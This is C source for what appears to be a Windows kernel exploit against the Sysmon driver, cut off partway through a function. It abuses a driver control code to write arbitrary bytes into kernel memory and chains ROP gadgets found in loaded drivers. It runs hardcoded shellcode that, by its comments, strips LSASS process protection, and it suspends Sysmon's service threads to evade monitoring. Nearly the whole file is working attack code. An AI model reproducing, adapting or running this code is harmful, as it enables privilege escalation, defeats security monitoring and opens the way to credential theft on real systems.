#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <TlHelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

#define NonPagedPool 0

//
// Define Sysmon target version.
//
#define V120

#ifdef V110
#define SYSMON_ZWOPENPROCESSTOKENEX_OFFSET 0x1F5E0
#define SYSMON_END_OF_DATA_SECTION_OFFSET 0x21000
#define SYSMON_REPORT_EVENT_LIST_OFFSET 0x1FAE0
#define SYSMON_RETURN_FROM_QUEUEEVENT_OFFSET 0x2834
#elif defined(V1110)
#define SYSMON_ZWOPENPROCESSTOKENEX_OFFSET 0x1F5E0
#define SYSMON_END_OF_DATA_SECTION_OFFSET 0x21000
#define SYSMON_REPORT_EVENT_LIST_OFFSET 0x1FAE0
#define SYSMON_RETURN_FROM_QUEUEEVENT_OFFSET 0x27C5
#elif defined(V1111)
#define SYSMON_ZWOPENPROCESSTOKENEX_OFFSET 0x1F718
#define SYSMON_END_OF_DATA_SECTION_OFFSET 0x21000
#define SYSMON_REPORT_EVENT_LIST_OFFSET 0x1FC60
#define SYSMON_RETURN_FROM_QUEUEEVENT_OFFSET 0x28A6
#elif defined(V120)
#define SYSMON_ZWOPENPROCESSTOKENEX_OFFSET 0x1F658
#define SYSMON_END_OF_DATA_SECTION_OFFSET 0x21000
#define SYSMON_REPORT_EVENT_LIST_OFFSET 0x1FB60
#define SYSMON_RETURN_FROM_QUEUEEVENT_OFFSET 0x289F
#endif

#define MAX_EVENT_SIZE 40000

 // Console colours.
#define CONSOLE_RED FOREGROUND_RED | FOREGROUND_INTENSITY
#define CONSOLE_DARK_RED FOREGROUND_RED
#define CONSOLE_GREEN FOREGROUND_GREEN | FOREGROUND_INTENSITY
#define CONSOLE_DARK_GREEN FOREGROUND_GREEN
#define CONSOLE_BLUE FOREGROUND_BLUE | FOREGROUND_INTENSITY
#define CONSOLE_DARK_BLUE FOREGROUND_BLUE
#define CONSOLE_CYAN FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY
#define CONSOLE_YELLOW FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_INTENSITY
#define CONSOLE_DARK_YELLOW FOREGROUND_GREEN | FOREGROUND_RED
#define CONSOLE_PURPLE FOREGROUND_BLUE | FOREGROUND_RED | FOREGROUND_INTENSITY
#define CONSOLE_DARK_PURPLE FOREGROUND_BLUE | FOREGROUND_RED
#define CONSOLE_WHITE FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_INTENSITY
#define CONSOLE_GRAY FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED

typedef enum _DEBUG_LEVEL {
	DEBUG_INFO,
	DEBUG_SUCCESS,
	DEBUG_WARNING,
	DEBUG_ERROR
} DEBUG_LEVEL;

CHAR dbgSym[] = {
	'*',	// DEBUG_INFO.
	'+',	// DEBUG_SUCCESS.
	'!',	// DEBUG_WARNING.
	'-'		// DEBUG_ERROR.
};

WORD dbgColour[] = {
	CONSOLE_WHITE,	// DEBUG_INFO.
	CONSOLE_GREEN,	// DEBUG_SUCCESS.
	CONSOLE_YELLOW,	// DEBUG_WARNING.
	CONSOLE_RED		// DEBUG_ERROR.
};

#define PRINT_INFO(fmt, ...) PrintDebug(DEBUG_INFO, fmt, __VA_ARGS__)
#define PRINT_SUCCESS(fmt, ... ) PrintDebug(DEBUG_SUCCESS, fmt, __VA_ARGS__)
#define PRINT_WARNING(fmt, ...) PrintDebug(DEBUG_WARNING, fmt, __VA_ARGS__)
#define PRINT_ERROR(fmt, ...) PrintDebug(DEBUG_ERROR, fmt, __VA_ARGS__)

#define GET_ROP_GADGET(x) \
	PRINT_INFO("Finding " #x " gadget\n"); \
	PVOID x ## Gadget = FindRopGadget(x ## Pattern, sizeof(x ## Pattern)); \
	if (!x ## Gadget) { \
		PRINT_ERROR("Failed to find " #x " gadget\n"); return FALSE; \
	}

#define GET_NT_PROC(x) \
	PVOID x = GetNtProc(#x); \
	if (!x) { \
		PRINT_ERROR("Failed to find " #x); return FALSE; \
	}

typedef struct _DISPATCHER_HEADER {
	union {
		struct {
			UCHAR Type;
			UCHAR Absolute;
			UCHAR Size;
			union {
				UCHAR Inserted;
				BOOLEAN DebugActive;
			};
		};
		volatile LONG Lock;
	};
	LONG SignalState;
	LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;

typedef struct _KEVENT {
	DISPATCHER_HEADER Header;
} KEVENT, * PKEVENT;

typedef struct _EVENT_HEADER {
	/*  0 */ ULONG Id;
	/*  4 */ ULONG Size;		// Total struct size.
	/*  8 */ PVOID Unk1;
	/* 10 */ ULONG EventDataSize;
} EVENT_HEADER, * PEVENT_HEADER;

typedef struct _FILE_DELETE_EVENT {
	/*   0 */ EVENT_HEADER EventHeader;
	/*  18 */ HANDLE ProcessHandle;
	/*  20 */ PVOID SystemUtcTime;
	/*  28 */ ULONG HashMethod;
	/*  2C */ BOOLEAN IsExecutable;
	/*  30 */ ULONG SidLength;
	/*  34 */ ULONG ObjectNameLength;
	/*  38 */ ULONG ImageFileNameLength;
	/*  3C */ ULONG HashLength;
	/*  40 */ WCHAR StatusString[256];
	/* 240 */ HANDLE ServiceProcessHandle;
	/* 248 */ PKEVENT Event;
	/* 250 */ PBOOLEAN IsArchivedAddress;
	/* 258 */ // User SID.
	/* xxx */ // Object name.
	/* xxx */ // Image file name.
	/* xxx */ // Hash file name.
} FILE_DELETE_EVENT, * PFILE_DELETE_EVENT;

typedef struct _SET_ARCHIVED_INFO {
	/*  0 */ BYTE IsArchived;
	/*  8 */ HANDLE ServiceProcessHandle;
	/* 10 */ PKEVENT Event;
	/* 18 */ PBYTE IsArchivedAddress;
} SET_ARCHIVED_INFO, * PSET_ARCHIVED_INFO;

typedef struct _ROP_GADGET_PATTERNS {
	PBYTE StackPivot;
	PBYTE PopRax;
	PBYTE MovRdxRax;
	PBYTE PopRdx;
} ROP_GADGET_PATTERNS, *PROP_GADGET_PATTERNS;

typedef struct _EXEC_CONTEXT {
	SET_ARCHIVED_INFO ArchivedInfo1;	// Set up pool for code.
	SET_ARCHIVED_INFO ArchivedInfo2;	// Execute pool code.
	PKEVENT EventBypass;				// Bypass KeSetEvent for fast writing.
} EXEC_CONTEXT, *PEXEC_CONTEXT;

typedef
VOID
WORKER_THREAD_ROUTINE(
	_In_ PVOID Parameter
);

typedef WORKER_THREAD_ROUTINE* PWORKER_THREAD_ROUTINE;

typedef struct _WORK_QUEUE_ITEM {
	LIST_ENTRY List;
	PWORKER_THREAD_ROUTINE WorkerRoutine;
	__volatile PVOID Parameter;
} WORK_QUEUE_ITEM, * PWORK_QUEUE_ITEM;

EXTERN_C
NTSTATUS
NTAPI
NtQuerySystemInformation(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
);

PVOID g_ServiceProcessHandle = NULL;
PVOID g_EventBypassAddr = NULL;
PKEVENT g_ValidEvent = NULL;
PVOID g_ValidStack = NULL;
BYTE g_EventBypassPattern[] = { 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, };

//
// Define your shellcode here. Maybe it's a good idea to keep
// the jump to ZwOpenProcessTokenEx so that it returns the correct
// values to Sysmon. Or you can just return an erroneous NTSTATUS
// value without calling ZwOpenProcessTokenEx.
// 
// Disables LSASS PPL, returns ZwOpenProcessTokenEx result 
// and fixes original ZwOpenProcessTokenEx pointer in SysmonDrv.
//
BYTE g_Shellcode[] = {
	0x90,
	0x51,
	0xB9, 0x00, 0x00, 0x00, 0x00,
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,			// KTHREAD
	0x48, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00,						// EPROCESS
	0x48, 0x8B, 0x80, /*0xE8, 0x02*//*0xF0, 0x02*/0x48, 0x04, 0x00, 0x00,			// Process
	0x48, 0x2D, /*0xE8, 0x02*//*0xF0, 0x02*/0x48, 0x04, 0x00, 0x00,				// sub rax, 0x448
	0x48, 0x39, 0x88, /*0xE0, 0x02*//*0xE8, 0x02*/0x40, 0x04, 0x00, 0x00,			// cmp PID
	0x75, 0xEA,
	0xC6, 0x80, /*0xCA, 0x06*//*0xFA, 0x06*/0x7A, 0x08, 0x00, 0x00, 0x00,			// Protection
	0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x89, 0x01,
	0x59,
	0xFF, 0xE0
};

VOID
PrintColour(
	_In_ WORD wColour, 
	_In_ LPCSTR fmt,
	...
)
{
	//
	// Save the state of the console.
	//
	CONSOLE_SCREEN_BUFFER_INFO info;
	GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &info);
	//
	// Change console colour.
	//
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), wColour);
	//
	// Print variadic arguments.
	//
	va_list ap;
	va_start(ap, fmt);

	vprintf(fmt, ap);

	va_end(ap);
	//
	// Restore original state of the console.
	//
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), info.wAttributes);
}

VOID
PrintDebug(
	_In_ DEBUG_LEVEL l, 
	_In_ LPCSTR fmt,
	...
)
{
	va_list ap;
	va_start(ap, fmt);

	printf("[");
	PrintColour(dbgColour[l], "%c", dbgSym[l]);
	printf("] ");
	vprintf(fmt, ap);

	va_end(ap);
}

ULONG
ProcessGetThreadIds(
	_In_ DWORD dwProcessId,
	_Out_ LPDWORD dwThreadIds,
	_In_ DWORD dwSizeInBytes,
	_Out_ LPDWORD dwNumThreads
)
{
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	ULONG uError = ERROR_SUCCESS;

	*dwNumThreads = 0;
	ZeroMemory(dwThreadIds, dwSizeInBytes);

	// Take a snapshot of all running threads  
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return GetLastError();
	}

	// Fill in the size of the structure before using it. 
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if (Thread32First(hSnapshot, &te32) == FALSE) {
		uError = GetLastError();
		CloseHandle(hSnapshot);     // Must clean up the snapshot object!
		return uError;
	}

	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	do {
		if (te32.th32OwnerProcessID == dwProcessId) {
			// Check if the dwThreadIds array has been exceeded.
			if (*dwNumThreads < dwSizeInBytes / sizeof(DWORD)) {
				dwThreadIds[*dwNumThreads] = te32.th32ThreadID;
			}

			// Keep a counter on how many relevant threads have been enumerated.
			*dwNumThreads = *dwNumThreads + 1;
		}
	} while (Thread32Next(hSnapshot, &te32) == TRUE);

	// Don't forget to clean up the snapshot object.
	CloseHandle(hSnapshot);

	return uError;
}

ULONG
GetProcIdByName(
	_In_ PCWSTR ProcName
)
{
	// Enumerate all processes
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnapshot == INVALID_HANDLE_VALUE || hProcessSnapshot == 0) {
		PRINT_ERROR("CreateToolhelp32Snapshot failed: %u\n", GetLastError());
		return 0;
	}

	// Get the PID of explorer.exe
	PROCESSENTRY32 pi;
	pi.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnapshot, &pi)) {
		do {
			if (!_wcsicmp(pi.szExeFile, ProcName)) {
				CloseHandle(hProcessSnapshot);
				return pi.th32ProcessID;
			}
		} while (Process32Next(hProcessSnapshot, &pi));
	}

	CloseHandle(hProcessSnapshot);

	return 0;
}

ULONG
GetLsaPid(

)
{
	HKEY Key;
	LSTATUS RegStatus;
	ULONG Pid = 0;
	ULONG DataSize = sizeof(ULONG);

	RegStatus = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
		0,
		KEY_READ,
		&Key
	);
	if (RegStatus) {
		PRINT_ERROR("Failed to open LSA registry key: %u\n", GetLastError());
		return 0;
	}
	
	RegStatus = RegQueryValueEx(
		Key,
		L"LsaPid",
		NULL,
		NULL,
		(PBYTE)&Pid,
		&DataSize
	);
	if (RegStatus) {
		PRINT_ERROR("Failed to read LSA PID: %u\n", GetLastError());
	}

	RegCloseKey(Key);

	if (!Pid) {
		Pid = GetProcIdByName(L"lsass.exe");
	}

	return Pid;
}

BOOL
PrivilegeSetPrivilege(
	_In_ HANDLE hToken,
	_In_ LPCTSTR lpszPrivilege,
	_In_ BOOL bEnablePrivilege
)
{
	LUID luid;
	BOOL bRet = FALSE;

	if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
		TOKEN_PRIVILEGES tp;

		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

		// Enable the privilege or disable all privileges.
		if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
			// Check to see if you have proper access.
			// You may get "ERROR_NOT_ALL_ASSIGNED".
			bRet = (GetLastError() == ERROR_SUCCESS);
		}
	}
	return bRet;
}

ULONG
ProcessSetPrivilege(
	_In_ HANDLE hProcess
)
{
	HANDLE hToken = NULL;

	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken) == FALSE) {
		return GetLastError();
	}

	PrivilegeSetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
	CloseHandle(hToken);

	return ERROR_SUCCESS;
}

BOOL
SuspendSysmonService(
	_In_ BOOL Suspend
)
{
	BOOL Success = FALSE;
	ULONG Error = 0;
	ULONG ProcessId = 0;
	HANDLE Process = NULL;
	HANDLE Thread = NULL;
	DWORD dwThreads[1024], dwThreadNum = 0;
	SC_HANDLE ServiceManager = NULL;
	SC_HANDLE Service = NULL;
	SERVICE_STATUS_PROCESS ServiceStatus;
	DWORD BytesNeeded = 0;

	//
	// Get PID from services.
	//
	ZeroMemory(&ServiceStatus, sizeof(SERVICE_STATUS_PROCESS));
	ServiceManager = OpenSCManager(NULL, NULL, 0);
	if (ServiceManager) {
		Service = OpenService(ServiceManager, L"Sysmon64", SERVICE_QUERY_STATUS);
		if (!Service) {
			Service = OpenService(ServiceManager, L"Sysmon", SERVICE_QUERY_STATUS);
			if (!Service) {
				PRINT_ERROR("OpenService failed: %u\n", GetLastError());
			}
		}

		if (Service) {
			Success = QueryServiceStatusEx(
				Service,
				SC_STATUS_PROCESS_INFO,
				(LPBYTE)&ServiceStatus,
				sizeof(SERVICE_STATUS_PROCESS),
				&BytesNeeded
			);
			if (Success) {
				ProcessId = ServiceStatus.dwProcessId;
			}

			CloseServiceHandle(Service);
		}

		CloseServiceHandle(ServiceManager);
	} else {
		PRINT_ERROR("OpenSCManager failed: %u\n", GetLastError());
	}

	//
	// Get PID by process name as backup.
	//
	if (!ProcessId) {
		ProcessId = GetProcIdByName(L"Sysmon64.exe");
		if (!ProcessId) {
			ProcessId = GetProcIdByName(L"Sysmon.exe");
		}
	}

	if (!ProcessId) {
		PRINT_ERROR("Failed to find Sysmon process ID.\n");
		return FALSE;
	}

	Process = OpenProcess(
		PROCESS_SUSPEND_RESUME | PROCESS_QUERY_INFORMATION,
		FALSE,
		ProcessId
	);
	if (!Process) {
		ProcessId = GetProcIdByName(L"Sysmon.exe");
		Process = OpenProcess(
			PROCESS_SUSPEND_RESUME | PROCESS_QUERY_INFORMATION,
			FALSE,
			ProcessId
		);
		if (!Process) {
			PRINT_ERROR("Failed to open Sysmon64.exe process.\n");
			goto end;
		}
	}

	ZeroMemory(dwThreads, sizeof(dwThreads));

	PRINT_INFO("%s Sysmon service...\n", Suspend ? "Suspending" : "Resuming");
	Error = ProcessGetThreadIds(
		ProcessId,
		dwThreads,
		sizeof(dwThreads),
		&dwThreadNum
	);
	if (Error) {
		PRINT_ERROR("Failed to get process threads: %u\n", Error);
		goto end;
	}

	for (ULONG i = 0; i < dwThreadNum; i++) {
		// Open thread with resume and suspend access rights.
		Thread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, dwThreads[i]);
		if (!Thread) {
			PRINT_WARNING("Failed to open thread %u: %u\n", dwThreads[i], GetLastError());
			continue;
		}
		
		if (Suspend) {
			if (SuspendThread(Thread) == -1) {
				PRINT_WARNING("Failed to suspend thread: %u\n", GetLastError());
			}
		} else {
			if (ResumeThread(Thread) == -1) {
				PRINT_WARNING("Failed to resume thread: %u\n", GetLastError());
			}
		}

		CloseHandle(Thread);
	}

	Success = TRUE;

end:
	if (Process) {
		CloseHandle(Process);
	}

	return Success;
}

PVOID
GetDriverBase(
	_In_ PCWSTR DriverName
)
{
	ULONG ReturnLength = 0;
	PVOID Drivers[1024];
	WCHAR DriverNames[MAX_PATH];

	ZeroMemory(Drivers, sizeof(Drivers));

	if (!EnumDeviceDrivers(Drivers, sizeof(Drivers), &ReturnLength)) {
		PRINT_ERROR("EnumDeviceDrivers failed: %u\n", GetLastError());
		return NULL;
	}

	for (SIZE_T i = 0; i < ReturnLength / sizeof(Drivers[0]); i++) {
		ZeroMemory(DriverNames, sizeof(DriverNames));

		if (GetDeviceDriverBaseName(Drivers[i], DriverNames, ARRAYSIZE(DriverNames))) {
			if (StrStrI(DriverNames, DriverName)) {
				return Drivers[i];
			}
		}
	}

	return NULL;
}

PVOID
LoadDriver(
	_In_ PCWSTR DriverName
)
{
	HMODULE Driver = NULL;
	WCHAR DriverDir[MAX_PATH * 2];
	ULONG Len = 0;

	Driver = LoadLibrary(DriverName);
	if (!Driver) {
		Len = GetSystemDirectory(DriverDir, MAX_PATH * 2);
		wcscat_s(DriverDir, MAX_PATH * 2, L"\\drivers\\");
		wcscat_s(DriverDir, MAX_PATH * 2, DriverName);

		//printf("Loading driver %ws.\n", DriverDir);
		Driver = LoadLibrary(DriverDir);
		if (!Driver) {
			PRINT_ERROR("LoadLibrary (%ws) failed: %u\n", DriverName, GetLastError());
			return NULL;
		}
	}

	return Driver;
}

HMODULE
LoadNtBaseLib(

)
{
	return LoadDriver(L"ntoskrnl.exe");
}

PVOID
GetNtProc(
	_In_ PCSTR ProcName
)
{
	PVOID Proc = NULL;
	HMODULE NtBaseLib = NULL;

	NtBaseLib = LoadNtBaseLib();
	if (!NtBaseLib) {
		return NULL;
	}

	Proc = GetProcAddress(NtBaseLib, ProcName);
	if (!Proc) {
		PRINT_ERROR("GetProcAddress [%s] failed: %u\n", ProcName, GetLastError());
		FreeLibrary(NtBaseLib);
		return NULL;
	}

	FreeLibrary(NtBaseLib);

	return (PVOID)((ULONG_PTR)GetDriverBase(L"ntoskrnl.exe") + (ULONG_PTR)Proc - (ULONG_PTR)NtBaseLib);
}

PVOID
FindPattern(
	_In_ PVOID Base,
	_In_ SIZE_T Size,
	_In_ PBYTE Pattern,
	_In_ SIZE_T PatternSize
)
{
	PVOID Address = NULL;

	for (PBYTE i = Base; i < (PBYTE)((ULONG_PTR)Base + Size); i++) {
		int j;
		for (j = 0; j < PatternSize; j++) {
			if (Pattern[j] != i[j]) {
				break;
			}
		}

		if (j == PatternSize) {
			Address = i;
			break;
		}
	}

	return Address;
}

PVOID
FindRopGadget(
	_In_ PBYTE Pattern,
	_In_ SIZE_T PatternSize
)
{
	ULONG ReturnLength = 0;
	PVOID Drivers[1024];
	WCHAR DriverName[MAX_PATH];
	PVOID DriverBase = NULL;
	PIMAGE_DOS_HEADER pidh;
	PIMAGE_NT_HEADERS pinh;
	PIMAGE_SECTION_HEADER pish;
	PVOID Address = NULL;

	ZeroMemory(Drivers, sizeof(Drivers));

	if (!EnumDeviceDrivers(Drivers, sizeof(Drivers), &ReturnLength)) {
		PRINT_ERROR("EnumDeviceDrivers failed: %u\n", GetLastError());
		return NULL;
	}

	//
	// Enumerate all drivers.
	//
	for (int i = 0; i < ReturnLength / sizeof(Drivers[0]); i++) {
		ZeroMemory(DriverName, sizeof(DriverName));
		if (!GetDeviceDriverBaseName(Drivers[i], DriverName, ARRAYSIZE(DriverName))) {
			PRINT_ERROR("Failed to get driver name.\n");
			continue;
		}

		DriverBase = LoadDriver(DriverName);
		if (!DriverBase) {
			continue;
		}

		pidh = (PIMAGE_DOS_HEADER)DriverBase;
		pinh = (PIMAGE_NT_HEADERS)((PBYTE)DriverBase + pidh->e_lfanew);
		//
		// Enumerate all sections.
		//
		for (SIZE_T i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
			pish = (PIMAGE_SECTION_HEADER)((PBYTE)IMAGE_FIRST_SECTION(pinh) + (IMAGE_SIZEOF_SECTION_HEADER * i));
			if (pish->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
				if (strstr(pish->Name, "INIT")) {
					continue;
				}

				Address = FindPattern(
					(PVOID)((ULONG_PTR)DriverBase + pish->VirtualAddress),
					pish->Misc.VirtualSize,
					Pattern,
					PatternSize
				);

				if (Address) {
					PRINT_SUCCESS("Found pattern in %ws @ %p.\n", DriverName, Address);

					FreeLibrary(DriverBase);
					return (PVOID)((ULONG_PTR)GetDriverBase(DriverName) + (ULONG_PTR)Address - (ULONG_PTR)DriverBase);
					//break;
				}
			}
		}
		FreeLibrary(DriverBase);
	}

	return NULL;
}

PVOID
GetNtPattern(
	_In_ PBYTE Pattern,
	_In_ SIZE_T PatternSize
)
{
	HMODULE NtBaseLib = NULL;
	PIMAGE_DOS_HEADER pidh;
	PIMAGE_NT_HEADERS pinh;
	PVOID Address = NULL;

	NtBaseLib = LoadNtBaseLib();
	if (!NtBaseLib) {
		return NULL;
	}

	pidh = (PIMAGE_DOS_HEADER)NtBaseLib;
	pinh = (PIMAGE_NT_HEADERS)((PBYTE)NtBaseLib + pidh->e_lfanew);

	Address = FindPattern(
		NtBaseLib,
		pinh->OptionalHeader.SizeOfImage,
		Pattern,
		PatternSize
	);
	if (Address) {
		Address = (PVOID)((ULONG_PTR)GetDriverBase(L"ntoskrnl.exe") +
			(ULONG_PTR)Address -
			(ULONG_PTR)NtBaseLib);
	}

	FreeLibrary(NtBaseLib);
	return Address;
}

BOOL
WritePrimitive(
	_In_ HANDLE Device,
	_In_ PVOID TargetAddress,
	_In_ PBYTE Data,
	_In_ SIZE_T DataSize
)
{
	BOOL Success;
	SET_ARCHIVED_INFO ArchivedInfo;

	ZeroMemory(&ArchivedInfo, sizeof(SET_ARCHIVED_INFO));

	//printf(
	//	"Writing:\n"
	//	"\tStarting target address: %p\n"
	//	"\tSize: %llu\n",
	//	TargetAddress,
	//	DataSize
	//);

	ArchivedInfo.ServiceProcessHandle = g_ServiceProcessHandle;
	ArchivedInfo.Event = g_EventBypassAddr;
	ArchivedInfo.IsArchivedAddress = TargetAddress;

	for (ULONG i = 0; i < DataSize; i++) {
		ArchivedInfo.IsArchived = Data[i];
		//printf("Sending %02x to %p... ", ArchivedInfo.IsArchived, ArchivedInfo.IsArchivedAddress);
		//getchar();
		Success = DeviceIoControl(
			Device,
			0x83400010,
			&ArchivedInfo,
			sizeof(SET_ARCHIVED_INFO),
			NULL,
			0,
			NULL,
			NULL
		);
		if (!Success) {
			printf("\nDeviceIoControl read data failed: %u\n", GetLastError());
			return FALSE;
		}

		ArchivedInfo.IsArchivedAddress++;
	}

	return TRUE;
}

BOOL
ExecuteRop(
	_In_ HANDLE Device
)
{
	BOOL Success;
	SET_ARCHIVED_INFO ArchivedInfo;

	ZeroMemory(&ArchivedInfo, sizeof(SET_ARCHIVED_INFO));

	ArchivedInfo.ServiceProcessHandle = g_ServiceProcessHandle;
	ArchivedInfo.Event = g_ValidEvent;
	ArchivedInfo.IsArchivedAddress = g_ValidStack;
	ArchivedInfo.IsArchived = 0xFF;

	//printf("Executing ROP...\n");
	//printf("Sending %02x to %p... ", ArchivedInfo.IsArchived, ArchivedInfo.IsArchivedAddress);
	//getchar();
	Success = DeviceIoControl(
		Device,
		0x83400010,
		&ArchivedInfo,
		sizeof(SET_ARCHIVED_INFO),
		NULL,
		0,
		NULL,
		NULL
	);
	if (!Success) {
		PRINT_ERROR("\nDeviceIoControl read data failed: %u\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

VOID
RemoveEntries(
	_In_ HANDLE Device
)
{
	BOOL Success;
	DWORD BytesReturned;
	PVOID EventData = NULL;
	ULONG_PTR Timer = 0;

	Timer = GetTickCount64();
	for (int i = 0; i < 50000; i++) {
		EventData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_EVENT_SIZE);
		if (!EventData) {
			printf("HeapAlloc EventData failed: %u\n", GetLastError());
			break;
		}

		Success = DeviceIoControl(
			Device,
			0x83400004,
			NULL,
			0,
			EventData,
			MAX_EVENT_SIZE,
			&BytesReturned,
			NULL
		);
		if (Success) {
			if (GetTickCount64() - Timer > 5000) {
				HeapFree(GetProcessHeap(), 0, EventData);
				break;
			}
		}

		HeapFree(GetProcessHeap(), 0, EventData);
	}
}

VOID
GenerateEvents(

)
{
	WCHAR ProcessName[MAX_PATH * 2];
	HANDLE FileHandle = INVALID_HANDLE_VALUE;
	DWORD Written = 0;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	GetModuleFileName(NULL, ProcessName, sizeof(ProcessName) / sizeof(WCHAR));

	while (TRUE) {
		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		ZeroMemory(&si, sizeof(STARTUPINFO));
		si.cb = sizeof(STARTUPINFO);

		CreateProcess(
			ProcessName,
			NULL,
			NULL,
			NULL,
			FALSE,
			0,
			NULL,
			NULL,
			&si,
			&pi
		);

		if (pi.hProcess) {
			TerminateProcess(pi.hProcess, 0);
			CloseHandle(pi.hProcess);
		}

		if (pi.hThread) {
			CloseHandle(pi.hThread);
		}

		FileHandle = CreateFile(
			L"delete_me",
			GENERIC_WRITE,
			0,
			NULL,
			OPEN_ALWAYS,
			0,
			NULL
		);
		if (FileHandle != INVALID_HANDLE_VALUE) {
			WriteFile(
				FileHandle,
				"a",
				1,
				&Written,
				NULL
			);

			CloseHandle(FileHandle);

			DeleteFile(L"delete_me");
		}
	}
}

BOOL
GetArchiveInfo(
	_In_ HANDLE Device,
	_Out_ PSET_ARCHIVED_INFO *ArchivedInfo
)
{
	BOOL Success;
	DWORD BytesReturned;
	PVOID EventData = NULL;
	PFILE_DELETE_EVENT FileDeleteEvent = NULL;

	*ArchivedInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SET_ARCHIVED_INFO));
	if (!*ArchivedInfo) {
		PRINT_ERROR("HeapAlloc ArchivedInfo failed: %u\n", GetLastError());
		return FALSE;
	}

	while (TRUE) {
		EventData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_EVENT_SIZE);
		if (!EventData) {
			PRINT_ERROR("HeapAlloc EventData failed: %u\n", GetLastError());
			break;
		}

		//
		// Read events.
		//
		PRINT_INFO("Reading event... ");
		Success = DeviceIoControl(
			Device,
			0x83400004,
			NULL,
			0,
			EventData,
			MAX_EVENT_SIZE,
			&BytesReturned,
			NULL
		);
		if (Success) {
			//
			// Check for file delete.
			//
			if (((PEVENT_HEADER)EventData)->Id == 0xF0000000) {
				puts("");
				PRINT_SUCCESS("File delete event found.\n");
				FileDeleteEvent = (PFILE_DELETE_EVENT)EventData;

				//
				// Check if Event is valid.
				//
				if (FileDeleteEvent->Event) {
					PRINT_SUCCESS("File delete Event is valid.\n");
					//ZeroMemory(ArchivedInfo, sizeof(SET_ARCHIVED_INFO));

					//
					// Initialise struct to write to kernel.
					//
					(*ArchivedInfo)->Event = FileDeleteEvent->Event;
					//
					// Should be this process.
					//
					(*ArchivedInfo)->ServiceProcessHandle = FileDeleteEvent->ServiceProcessHandle;
					//
					// Set target address to write byte.
					//
					(*ArchivedInfo)->IsArchivedAddress = FileDeleteEvent->IsArchivedAddress;
					//
					// Set byte to write.
					//
					(*ArchivedInfo)->IsArchived = FALSE;

					//printf("Got stack address: %p.\n", (*ArchivedInfo)->IsArchivedAddress);
					//
					// Send to driver.
					//
					PRINT_SUCCESS("Setup successful.\n");

					HeapFree(GetProcessHeap(), 0, EventData);

					return TRUE;
				} else {
					printf("File delete event is not writable. Discarding...\n");
				}
			} else {
				printf("Not a delete event. Discarding...\n");
			}
		} else {
			PRINT_WARNING("\nDeviceIoControl write data failed: %u\n", GetLastError());
		}

		HeapFree(GetProcessHeap(), 0, EventData);
	}

	return FALSE;
}

PVOID
GetPool(
	_In_ HANDLE Device,
	_In_ PVOID StackAddress,
	_In_ SIZE_T DataSize
)
{
	BOOL Success;
	PVOID EventBypassAddr = NULL;
	PVOID SysmonBase = NULL;
	PVOID SysmonTarget;
	PVOID SysmonRestore = NULL;
	PVOID SysmonEventList = NULL;
	PVOID StackReturnAddress = NULL;
	SIZE_T PoolType = NonPagedPool;
	PVOID Zero = 0;
	DWORD BytesReturned;
	PVOID EventData = NULL;
	PVOID Pool = NULL;

	BYTE StackPivotPattern[] = { 0x5C, 0xC3 };
	BYTE PopRaxPattern[] = { 0x58, 0xC3 };
	BYTE MovRdxRaxPattern[] = { 0x48, 0x89, 0x02, 0xC3 };
	BYTE PopRdxPattern[] = { 0x5A, 0xC3 };
	BYTE PopRcxPattern[] = { 0x59, 0xC3 };
	BYTE PopR8Pattern[] = { 0x41, 0x58, 0xC3 };
	BYTE AddRsp25Pattern[] = { 0x48, 0x83, 0xC4, 0x20, 0x59, 0xC3 };
